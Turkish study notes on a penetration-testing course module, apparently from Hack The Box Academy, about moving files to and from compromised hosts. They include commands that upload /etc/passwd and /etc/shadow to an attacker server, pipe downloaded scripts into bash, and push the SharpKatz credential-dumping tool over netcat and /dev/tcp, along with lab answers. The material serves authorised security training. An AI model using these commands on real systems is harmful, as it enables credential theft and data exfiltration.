```shell-session
M1R4CKCK@htb[/htb]$ netstat -lnpt

(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      - 
```

Şimdi dosyaları aktarmaya başlayabiliriz. Pwnbox'ımızın IP adresini ve kullanıcı adı ve şifresini belirtmemiz gerekiyor.

#### Linux - Downloading Files Using SCP

```shell-session
$ scp plaintext@192.168.49.128:/root/myroot.txt . 
```

**Not:** Dosya aktarımları için geçici bir kullanıcı hesabı oluşturabilir ve remote bir bilgisayarda birincil kimlik bilgilerinizi veya anahtarlarınızı kullanmaktan kaçınabilirsiniz.

## Upload Operations
Binary exploitation ve packet capture analysis gibi hedef makinemizden saldırı hostumuza dosya yüklememiz gereken durumlar da vardır. İndirmeler için kullandığımız yöntemler yüklemeler için de işe yarayacaktır. Dosyaları çeşitli şekillerde nasıl yükleyebileceğimizi görelim.


## Web Upload

`Windows File Transfer Methods` bölümünde belirtildiği gibi, bir dosya yükleme sayfası içeren Python `HTTP.Server` modülünün genişletilmiş bir modülü olan uploadserver'ı kullanabiliriz. Bu Linux örneği için, `uploadserver` modülünü güvenli iletişim için `HTTPS` kullanacak şekilde nasıl yapılandırabileceğimizi görelim.

Yapmamız gereken ilk şey `uploadserver` modülünü kurmak.

#### Pwnbox - Start Web Server

```shell-session
M1R4CKCK@htb[/htb]$ sudo python3 -m pip install --user uploadserver

Collecting uploadserver
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1
```

Şimdi bir sertifika oluşturmamız gerekiyor. Bu örnekte, kendinden imzalı bir sertifika kullanıyoruz.

#### Pwnbox - Create a Self-Signed Certificate

```shell-session
M1R4CKCK@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

Generating a RSA private key
................................................................................+++++
.......+++++
writing new private key to 'server.pem'
-----
```
Web sunucusu sertifikayı barındırmamalıdır. Web sunucumuz için dosyayı barındıracak yeni bir dizin oluşturmanızı öneririz.

#### Pwnbox - Start Web Server

```shell-session
$ mkdir https && cd https
```

```shell-session
M1R4CKCK@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

File upload available at /upload
Serving HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...
```

Şimdi ele geçirilmiş makinemizden `/etc/passwd` ve `/etc/shadow` dosyalarını yükleyelim.


#### **Linux - Birden Fazla Dosya Yükleme**

```shell-session
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

Güvendiğimiz kendinden imzalı bir sertifika kullandığımız için `--insecure` seçeneğini kullandık.


## **Alternatif Web Dosya Aktarım Yöntemi**
Linux dağıtımlarında genellikle `Python` veya `php` yüklü olduğundan, dosya aktarmak için bir web sunucusu başlatmak kolaydır. Ayrıca, eğer uzlaştığımız sunucu bir web sunucusu ise, aktarmak istediğimiz dosyaları web sunucusu dizinine taşıyabilir ve web sayfasından erişebiliriz, bu da dosyayı Pwnbox'ımızdan indirdiğimiz anlamına gelir.  

Bir web sunucusunu çeşitli diller kullanarak ayağa kaldırmak mümkündür. Güvenliği ihlal edilmiş bir Linux makinede web sunucusu kurulu olmayabilir. Bu gibi durumlarda mini bir web sunucusu kullanabiliriz. Güvenlik açısından eksik olsalar da, webroot konumu ve dinleme portları hızlı bir şekilde değiştirilebildiğinden esnekliği telafi ederler.


#### Linux - Creating a Web Server with Python3

```shell-session
M1R4CKCK@htb[/htb]$ python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

#### Linux - Creating a Web Server with Python2.7

```shell-session
M1R4CKCK@htb[/htb]$ python2.7 -m SimpleHTTPServer

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

#### Linux - Creating a Web Server with PHP

```shell-session
M1R4CKCK@htb[/htb]$ php -S 0.0.0.0:8000

[Fri May 20 08:16:47 2022] PHP 7.4.28 Development Server (http://0.0.0.0:8000) started
```

#### Linux - Creating a Web Server with Ruby

```shell-session
M1R4CKCK@htb[/htb]$ ruby -run -ehttpd . -p8000

[2022-05-23 09:35:46] INFO  WEBrick 1.6.1
[2022-05-23 09:35:46] INFO  ruby 2.7.4 (2021-07-07) [x86_64-linux-gnu]
[2022-05-23 09:35:46] INFO  WEBrick::HTTPServer#start: pid=1705 port=8000
```

#### **Dosyayı Hedef Makineden Pwnbox'a İndirin**

```shell-session
M1R4CKCK@htb[/htb]$ wget 192.168.49.128:8000/filetotransfer.txt

--2022-05-20 08:13:05--  http://192.168.49.128:8000/filetotransfer.txt
Connecting to 192.168.49.128:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 0 [text/plain]
Saving to: 'filetotransfer.txt'

filetotransfer.txt                       [ <=>                                                                  ]       0  --.-KB/s    in 0s      

2022-05-20 08:13:05 (0.00 B/s) - ‘filetotransfer.txt’ saved [0/0]
```

**Not:** Python veya PHP kullanarak yeni bir web sunucusu başlattığımızda, gelen trafiğin engellenebileceğini göz önünde bulundurmak önemlidir. Hedefimizden saldırı sunucumuza bir dosya aktarıyoruz, ancak dosyayı yüklemiyoruz.


## SCP Upload
Giden bağlantılar için `SSH protokolüne` (TCP/22) izin veren bazı şirketler bulabiliriz ve eğer durum buysa, dosyaları yüklemek için `scp` yardımcı programı ile bir SSH sunucusu kullanabiliriz. SSH protokolünü kullanarak hedef makineye bir dosya yüklemeyi deneyelim.

#### File Upload using SCP

```shell-session
M1R4CKCK@htb[/htb]$ scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/

htb-student@10.129.86.90's password: 
passwd                            
```
**Not:** scp sözdiziminin cp veya copy ile benzer olduğunu unutmayın.

## **İleriye doğru**  

Bunlar Linux sistemlerinde yerleşik araçları kullanan en yaygın dosya aktarım yöntemleridir, ancak daha fazlası da vardır. İlerleyen bölümlerde, dosya aktarım işlemlerini gerçekleştirmek için kullanabileceğimiz diğer mekanizmaları ve araçları tartışacağız.



Soru : Pwnbox'tan Python kullanarak flag.txt dosyasını web root'undan indirin. Dosyanın içeriğini cevabınız olarak gönderin.

Cevap : 
![Pasted image 20241031142255.png](/img/user/resimler/Pasted%20image%2020241031142255.png)



Soru : Ekteki upload_nix.zip adlı dosyayı seçtiğiniz yöntemi kullanarak hedefe yükleyin. Yüklendikten sonra kutuya SSH ile bağlanın, dosyayı çıkarın ve komut satırından “hasher <çıkarılan dosya>” komutunu çalıştırın. Oluşturulan hash'i cevabınız olarak gönderin.


cevap : 

![Pasted image 20241031142457.png](/img/user/resimler/Pasted%20image%2020241031142457.png)

![Pasted image 20241031142505.png](/img/user/resimler/Pasted%20image%2020241031142505.png)

![Pasted image 20241031142636.png](/img/user/resimler/Pasted%20image%2020241031142636.png)

Not : Zİpden çıkar sonra yolla !!


# **Dosyaları Kod ile Aktarma**

Hedeflediğimiz makinelerde farklı programlama dillerinin yüklü olduğunu görmek yaygındır. Python, PHP, Perl ve Ruby gibi programlama dilleri Linux dağıtımlarında yaygın olarak bulunur, ancak çok daha az yaygın olmasına rağmen Windows'a da yüklenebilir.  

JavaScript veya VBScript kodunu çalıştırmak için `cscript` ve `mshta` gibi bazı Windows varsayılan uygulamalarını kullanabiliriz. JavaScript Linux hostlarda da çalışabilir.

Wikipedia'ya göre, yaklaşık [700 programlama dili](https://en.wikipedia.org/wiki/List_of_programming_languages) vardır ve işletim sistemine talimatları indirmek, yüklemek veya yürütmek için herhangi bir programlama dilinde kod oluşturabiliriz. Bu bölümde yaygın programlama dilleri kullanılarak birkaç örnek verilecektir.

## Python

Python popüler bir programlama dilidir. Şu anda sürüm 3 desteklenmektedir, ancak Python sürüm 2.7'nin hala mevcut olduğu sunucular bulabiliriz. `Python`, `-c` seçeneğini kullanarak işletim sistemi komut satırından tek satırlı komutlar çalıştırabilir. Şimdi bazı örnekler görelim:

#### Python 2 - Download

```shell-session
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

#### Python 3 - Download

```shell-session
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```


## PHP

`PHP` de çok yaygındır ve birden fazla dosya aktarım yöntemi sağlar. [W3Techs'in verilerine göre](https://w3techs.com/technologies/details/pl-php) PHP, bilinen bir sunucu tarafı programlama diline sahip tüm web sitelerinin %77,4'ü tarafından kullanılmaktadır. Bilgiler kesin olmasa ve sayı biraz daha düşük olsa da, saldırgan bir işlem gerçekleştirirken PHP kullanan web hizmetleriyle sık sık karşılaşacağız.

PHP kullanarak dosya indirmenin bazı örneklerini görelim.  

Aşağıdaki örnekte, bir web sitesinden içerik indirmek için PHP [file_get_contents() modülünü](https://www.php.net/manual/en/function.file-get-contents.php), dosyayı bir dizine kaydetmek için [file_put_contents()](https://www.php.net/manual/en/function.file-put-contents.php) [modülü](https://www.php.net/manual/en/function.file-get-contents.php) ile birlikte kullanacağız. `PHP` `, -r` seçeneği kullanılarak işletim sistemi komut satırından tek satırlı komutları çalıştırmak için kullanılabilir `.`


#### **File_get_contents() ile PHP İndirme**

```shell-session
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

`file_get_contents()` ve `file_put_contents(` [)](“https://www.php.net/manual/en/function.fopen.php”) işlevlerine bir alternatif de [fopen() modülüdür](“https://www.php.net/manual/en/function.fopen.php”). Bu modülü bir URL'yi açmak, içeriğini okumak ve bir dosyaya kaydetmek için kullanabiliriz.


#### **Fopen() ile PHP İndirme**
```shell-session
php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

Bunun yerine, önceki bölümde cURL ve wget kullanarak gerçekleştirdiğimiz fileless örneğine benzer şekilde, indirilen içeriği bir pipe'a da gönderebiliriz.

#### **PHP Dosya İndirme ve Bash'e Pipe Etme**

```shell-session
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

**Not:** URL, fopen wrapper'ları etkinleştirilmişse @file fonksiyonu ile dosya adı olarak kullanılabilir.


## Other Languages
`Ruby` ve `Perl` de dosya aktarmak için kullanılabilen diğer popüler dillerdir. Bu iki programlama dili `, -e` seçeneğini kullanarak işletim sistemi komut satırından tek satırlı dosyaları çalıştırmayı da destekler.


#### Ruby - Download a File
```shell-session
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

#### Perl - Download a File
```shell-session
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```


## JavaScript
JavaScript, web sayfalarında karmaşık özellikler uygulamanıza olanak tanıyan bir komut dosyası veya programlama dilidir. Diğer programlama dillerinde olduğu gibi, onu birçok farklı şey için kullanabiliriz.  

Aşağıdaki JavaScript kodu [bu](https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068) yazıya dayanmaktadır ve bunu kullanarak bir dosya indirebiliriz. `wget.js` adında bir dosya oluşturacağız ve aşağıdaki içeriği kaydedeceğiz:


```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

JavaScript kodumuzu çalıştırmak ve bir dosya indirmek için Windows komut isteminden veya PowerShell terminalinden aşağıdaki komutu kullanabiliriz.


#### **JavaScript ve cscript.exe Kullanarak Dosya İndirme**
```cmd-session
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```


## VBScript
[VBScript](https://en.wikipedia.org/wiki/VBScript) (“Microsoft Visual Basic Scripting Edition”) Microsoft tarafından geliştirilen ve Visual Basic'i model alan bir Aktif Komut Dosyası dilidir. VBScript, Windows 98'den bu yana Microsoft Windows'un her masaüstü sürümünde varsayılan olarak yüklüdür.

[Buna](“https://stackoverflow.com/questions/2973136/download-a-file-with-vbs”) dayanarak aşağıdaki VBScript örneği kullanılabilir. `wget.vbs` adında bir dosya oluşturacağız ve aşağıdaki içeriği kaydedeceğiz:

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

VBScript kodumuzu çalıştırmak ve bir dosya indirmek için Windows komut isteminden veya PowerShell terminalinden aşağıdaki komutu kullanabiliriz.


#### **VBScript ve cscript.exe Kullanarak Dosya İndirme**
```cmd-session
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```



## **Python3 Kullanarak Yükleme İşlemleri**
Eğer bir dosya yüklemek istiyorsak, yükleme işlemini gerçekleştirmek için belirli bir programlama dilindeki fonksiyonları anlamamız gerekir. Python3 [requests modülü](https://pypi.org/project/requests/), Python kullanarak HTTP istekleri (GET, POST, PUT, vb.) göndermenizi sağlar. Python3 [uploadserver](https://github.com/Densaugeo/uploadserver)'ımıza bir dosya yüklemek istiyorsak aşağıdaki kodu kullanabiliriz.


#### **Python uploadserver Modülünü Başlatma**
```shell-session
[!bash!]$ python3 -m uploadserver 

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```


#### **Python One-liner Kullanarak Dosya Yükleme**
```shell-session
[!bash!]$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

Her bir parçayı daha iyi anlamak için bu tek satırı birden fazla satıra bölelim.

```python
# requests fonksiyonunu kullanmak için önce modülü içe aktarmamız gerekir.
import requests 

# Dosyayı yükleyeceğimiz hedef URL'yi tanımlayın.
URL = "http://192.168.49.128:8000/upload"

# Okumak istediğimiz dosyayı tanımlayın, açın ve bir değişkene kaydedin.
file = open("/etc/passwd","rb")

# Dosyayı yüklemek için bir requests POST isteği kullanın. 
r = requests.post(url,files={"files":file})
```

Aynı şeyi başka herhangi bir programlama dili ile de yapabiliriz. Birini seçip bir yükleme programı oluşturmaya çalışmak iyi bir uygulamadır.

## **Bölüm Özeti**  

Dosyaları indirmek ve yüklemek için kodu nasıl kullanabileceğimizi anlamak, bir kırmızı takım tatbikatı, bir sızma testi, bir CTF yarışması, bir olay müdahale tatbikatı, bir adli soruşturma veya hatta günlük sistem yöneticisi çalışmalarımız sırasında hedeflerimize ulaşmamıza yardımcı olabilir.


# **Çeşitli Dosya Aktarım Yöntemleri**

Bu bölümde [Netcat](https://en.wikipedia.org/wiki/Netcat), [Ncat](https://nmap.org/ncat/) kullanarak ve RDP ve PowerShell oturumlarını kullanarak dosya aktarımı gibi alternatif yöntemleri ele alacağız.

## **Netcat**  

[Netcat](https://sectools.org/tool/netcat/) (genellikle `nc` olarak kısaltılır), TCP veya UDP kullanarak ağ bağlantılarından okuma ve ağ bağlantılarına yazma için bir bilgisayar ağı yardımcı programıdır, bu da dosya aktarım işlemleri için kullanabileceğimiz anlamına gelir.  

Orijinal Netcat 1995 yılında Hobbit tarafından [piyasaya](http://seclists.org/bugtraq/1995/Oct/0028.html) sürüldü, ancak popülerliğine rağmen bakımı yapılmadı. Bu aracın esnekliği ve kullanışlılığı Nmap Projesi'ni SSL, IPv6, SOCKS ve HTTP proxy'leri, bağlantı aracılığı ve daha fazlasını destekleyen modern bir yeniden uygulama olan [Ncat](https://nmap.org/ncat/)'i üretmeye teşvik etti.  

Bu bölümde hem orijinal Netcat'i hem de Ncat'i kullanacağız.  

**Not:** **Ncat**, HackTheBox'ın PwnBox'ında nc, ncat ve netcat olarak kullanılmaktadır.


## **Netcat ve Ncat ile Dosya Transferi**

Hedef veya saldıran makine bağlantıyı başlatmak için kullanılabilir, bu da bir güvenlik duvarı hedefe erişimi engelliyorsa yararlıdır. Bir örnek oluşturalım ve hedefimize bir araç aktaralım.  

Bu örnekte, [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) 'yi Pwnbox'ımızdan ele geçirilmiş makineye aktaracağız. Bunu iki yöntem kullanarak yapacağız. İlk yöntem üzerinde çalışalım.  

İlk olarak ele geçirilen makinede Netcat'i (n`c`) başlatacağız, `-l` seçeneği ile dinleyeceğiz, `-p 8000` seçeneği ile dinlenecek portu seçeceğiz ve [stdout](https://en.wikipedia.org/wiki/Standard_streams#Standard_input_(stdin)) 'u tek bir büyüktür `>` ve ardından `SharpKatz.exe` dosya adını kullanarak yönlendireceğiz.


#### **NetCat - Güvenliği Aşılmış Makine - 8000 Portunda Dinleme yapıyor**

```shell-session
victim@target:~$ # Orijinal Netcat kullanan örnek
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
```

Eğer ele geçirilen makine Ncat kullanıyorsa, dosya aktarımı bittikten sonra bağlantıyı kapatmak için `--recv-only` belirtmemiz gerekecektir.

#### **Ncat - Güvenliği Aşılmış Makine - 8000 Portunda Dinlenme** yapıyor
```shell-session
victim@target:~$ # Example using Ncat
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```

Saldırı hostumuzdan, Netcat kullanarak 8000 portundaki tehlikeye atılmış makineye bağlanacağız ve [SharpKatz.exe](“https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe”) dosyasını Netcat'e girdi olarak göndereceğiz. `-q 0` seçeneği Netcat'e bittiğinde bağlantıyı kapatmasını söyleyecektir. Bu şekilde, dosya aktarımının ne zaman tamamlandığını bileceğiz.


#### **Netcat - Saldırı Hostu - Tehlikeye Girmiş Makineye Dosya Gönderme**

```shell-session
M1R4CKCK@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
M1R4CKCK@htb[/htb]$ # Example using Original Netcat
M1R4CKCK@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```
Saldıran hostumuzda Ncat kullanarak `-q` yerine `--send-only` seçeneğini tercih edebiliriz. Hem connect hem de listen modlarında kullanıldığında `--send-only` bayrağı, Ncat'in girdisi tükendiğinde sonlandırılmasını ister. Tipik olarak, uzak taraf ek veri iletebileceğinden, Ncat ağ bağlantısı kapanana kadar çalışmaya devam eder. Ancak, `--send-only` ile daha fazla gelen bilgiyi tahmin etmeye gerek yoktur.

#### **Ncat - Saldırı Hostu - Tehlikeye Girmiş Makineye Dosya Gönderme**

```shell-session
M1R4CKCK@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
M1R4CKCK@htb[/htb]$ # Example using Ncat
M1R4CKCK@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

Ele geçirilmiş makinemizde dinlemek yerine, dosya aktarım işlemini gerçekleştirmek için saldırı hostumuzdaki bir porta bağlanabiliriz. Bu yöntem, gelen bağlantıları engelleyen bir güvenlik duvarının olduğu senaryolarda kullanışlıdır. Pwnbox'ımızdaki 443 numaralı portu dinleyelim ve [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) dosyasını Netcat'e girdi olarak gönderelim.


#### **Saldırı Hostu - Netcat'e Girdi Olarak Dosya Gönderme**
```shell-session
M1R4CKCK@htb[/htb]$ # Example using Original Netcat
M1R4CKCK@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

#### **Güvenliği Aşılmış Makine Dosyayı Almak için Netcat'e Bağlanır**
```shell-session
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
```

Aynı şeyi Ncat için de yapalım:


#### **Saldırı Hostu - Ncat'e Girdi Olarak Dosya Gönderme**
```shell-session
M1R4CKCK@htb[/htb]$ # Example using Ncat
M1R4CKCK@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

#### **Güvenliği Aşılmış Makine Dosyayı Almak İçin Ncat'e Bağlanır**
```shell-session
victim@target:~$ # Example using Ncat
victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

Eğer ele geçirilmiş makinemizde Netcat veya Ncat yoksa, Bash [/dev/TCP/](https://tldp.org/LDP/abs/html/devref1.html) sahte aygıt dosyası üzerinde okuma/yazma işlemlerini destekler.  

Bu dosyaya yazmak Bash'in `host:port`'a bir TCP bağlantısı açmasını sağlar ve bu özellik dosya transferleri için kullanılabilir.


#### **NetCat - Netcat'e Girdi Olarak Dosya Gönderme**
```shell-session
M1R4CKCK@htb[/htb]$ # Example using Original Netcat
M1R4CKCK@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```


#### **Ncat - Dosyayı Ncat'e Girdi Olarak Gönderme**
```shell-session
M1R4CKCK@htb[/htb]$ # Example using Ncat
M1R4CKCK@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

#### **Güvenliği Aşılmış Makine Dosya Almak için /dev/tcp Kullanarak Netcat'e Bağlanıyor**
```shell-session
victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

**Not:** Aynı işlem, ele geçirilen hosttan Pwnbox'ımıza dosya aktarmak için de kullanılabilir.


## PowerShell Session File Transfer
PowerShell ile dosya aktarımı yapmaktan zaten bahsetmiştik, ancak HTTP, HTTPS veya SMB'nin kullanılamadığı senaryolar olabilir. Bu durumda, dosya aktarım işlemlerini gerçekleştirmek için [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2), diğer adıyla WinRM'yi kullanabiliriz.  

[PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2), PowerShell oturumlarını kullanarak uzaktaki bir bilgisayarda komut dosyaları veya komutlar çalıştırmamızı sağlar. Yöneticiler PowerShell Remoting'i genellikle bir ağdaki uzak bilgisayarları yönetmek için kullanır ve biz de dosya aktarım işlemleri için kullanabiliriz. Varsayılan olarak, PowerShell Remoting'i etkinleştirmek hem bir HTTP hem de bir HTTPS dinleyicisi oluşturur. Dinleyiciler HTTP için TCP/5985 ve HTTPS için TCP/5986 varsayılan portları üzerinde çalışır.

`DC01`'de `Administrator` olarak bir oturumumuz var, kullanıcı `DATABASE01` üzerinde yönetici haklarına sahip ve PowerShell Remoting etkin. WinRM'ye bağlanabildiğimizi doğrulamak için Test-NetConnection'ı kullanalım.


#### **DC01'den - WinRM portu TCP 5985'in DATABASE01 üzerinde Açık olduğunu onaylayın.**

```powershell-session
PS C:\htb> whoami

htb\administrator

PS C:\htb> hostname

DC01
```

```powershell-session
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985

ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True
```

Bu oturum zaten `DATABASE01` üzerinde ayrıcalıklara sahip olduğundan, kimlik bilgilerini belirtmemize gerek yoktur. Aşağıdaki örnekte, `DATABASE01` adlı uzak bilgisayara bir oturum oluşturulur ve sonuçlar `$Session` adlı değişkende saklanır.

#### **DATABASE01 için bir PowerShell Remoting Oturumu Oluşturma**
```powershell-session
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
```

Lokal makinemiz `DC01` 'den `$Session` 'a sahip olduğumuz `DATABASE01` `oturumuna` veya tam tersine bir dosya kopyalamak için `Copy-Item` cmdlet'ini kullanabiliriz.

#### **Samplefile.txt dosyasını Localhost'umuzdan DATABASE01 Oturumuna kopyalayın**

```powershell-session
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

#### **DATABASE01 Oturumundan DATABASE.txt dosyasını Localhost'umuza kopyalayın**
```powershell-session
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```


## **RDP**  

RDP (Uzak Masaüstü Protokolü), Windows ağlarında uzaktan erişim için yaygın olarak kullanılır. RDP kullanarak kopyalama ve yapıştırma yoluyla dosya aktarımı yapabiliriz. Bağlandığımız Windows makineden bir dosyayı sağ tıklayıp kopyalayabilir ve RDP oturumuna yapıştırabiliriz.  

Eğer Linux'tan bağlanıyorsak `xfreerdp` veya `rdesktop` kullanabiliriz. Bu yazının yazıldığı sırada, `xfreerdp` ve `rdesktop` hedef makinemizden RDP oturumuna kopyalamaya izin veriyordu, ancak bunun beklendiği gibi çalışmayabileceği senaryolar olabilir.  

Kopyalama ve yapıştırmaya alternatif olarak, hedef RDP sunucusuna lokal bir kaynak bağlayabiliriz. `rdesktop` veya `xfreerdp`, uzak RDP oturumunda lokal bir klasörü açığa çıkarmak için kullanılabilir.


### Linux Klasörünü rdesktop Kullanarak Mounting Etme
```shell-session
M1R4CKCK@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```


#### **Linux Klasörünü xfreerdp Kullanarak Bağlama**
```shell-session
M1R4CKCK@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfe
```


Dizine erişmek için `\\tsclient\` adresine bağlanabiliriz, böylece RDP oturumuna ve oturumdan dosya aktarabiliriz.

![Pasted image 20241101020936.png](/img/user/resimler/Pasted%20image%2020241101020936.png)

Alternatif olarak, Windows'tan yerel [mstsc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc) uzak masaüstü istemcisi kullanılabilir.

![Pasted image 20241101020953.png](/img/user/resimler/Pasted%20image%2020241101020953.png)

Sürücüyü seçtikten sonra, aşağıdaki remote oturumda sürücü ile etkileşime geçebiliriz.  

**Not:** Bu sürücüye, RDP oturumunu ele geçirmeyi başarsalar bile, hedef bilgisayarda oturum açmış diğer kullanıcılar erişemez.


## **Pratik Yapmak Mükemmelleştirir**  

Bu bölüme atıfta bulunmaya veya bu teknikler hakkında kendi notlarınızı oluşturmaya ve bunları Sızma Test Uzmanı İş Rolü Yolundaki ve ötesindeki diğer modüllerdeki laboratuvarlara uygulamaya değer. Bunların kullanışlı olabileceği bazı modüller/bölümler şunlardır:  

- `Active Directory Numaralandırma ve Saldırılar` - Beceri Değerlendirmeleri 1 & 2  
    
- `Pivoting, Tunnelling & Port Forwarding` modülü boyunca  
    
- `Kurumsal Ağlara Saldırma` modülü boyunca  
    
- `Shell & Payloads` modülü boyunca  
    

Bir laboratuvara (veya gerçek dünya değerlendirmesine) başlayana kadar neyle karşı karşıya olduğunuzu asla bilemezsiniz. Bu bölümdeki veya bu modülün diğer bölümlerindeki bir teknikte ustalaştığınızda, başka bir teknik deneyin. Sızma Test Uzmanı İş Rolü Yolunu bitirdiğinizde, bu tekniklerin hepsini olmasa da çoğunu denemiş olmanız harika olacaktır. Bu, “kas hafızanıza” yardımcı olacak ve bir yöntemi daha kolay başarısız kılan belirli kısıtlamalara sahip farklı bir ortamla karşılaştığınızda dosyaları nasıl yükleyeceğiniz / indireceğiniz konusunda size fikir verecektir. Bir sonraki bölümde, hassas verilerle uğraşırken dosya aktarımlarımızı korumayı tartışacağız.


# **Korumalı Dosya Aktarımları**  

Sızma testi uzmanları olarak, genellikle kullanıcı listeleri, kimlik bilgileri (örneğin, çevrimdışı parola kırma için NTDS.dit dosyasını indirme) ve kuruluşun ağ altyapısı ve Active Directory (AD) ortamı vb. hakkında kritik bilgiler içerebilen numaralandırma verileri gibi son derece hassas verilere erişim elde ederiz. Bu nedenle, bu verilerin şifrelenmesi veya SSH, SFTP ve HTTPS gibi şifreli veri bağlantılarının kullanılması çok önemlidir. Ancak, bazen bu seçenekler bizim için mevcut değildir ve farklı bir yaklaşım gereklidir.  

Not: Bir müşteri tarafından özellikle talep edilmediği sürece, Kişisel Olarak Tanımlanabilir Bilgiler (PII), finansal veriler (örn. kredi kartı numaraları), ticari sırlar vb. gibi verilerin bir müşteri ortamından dışarı sızmasını önermiyoruz. Bunun yerine, Veri Kaybını Önleme (DLP) kontrollerini/egress filtreleme korumalarını test etmeye çalışıyorsanız, müşterinin korumaya çalıştığı verileri taklit eden sahte veriler içeren bir dosya oluşturun.

Bu nedenle, aktarımdan önce verilerin veya dosyaların şifrelenmesi, verilerin aktarım sırasında ele geçirilmesi halinde okunmasını önlemek için genellikle gereklidir.
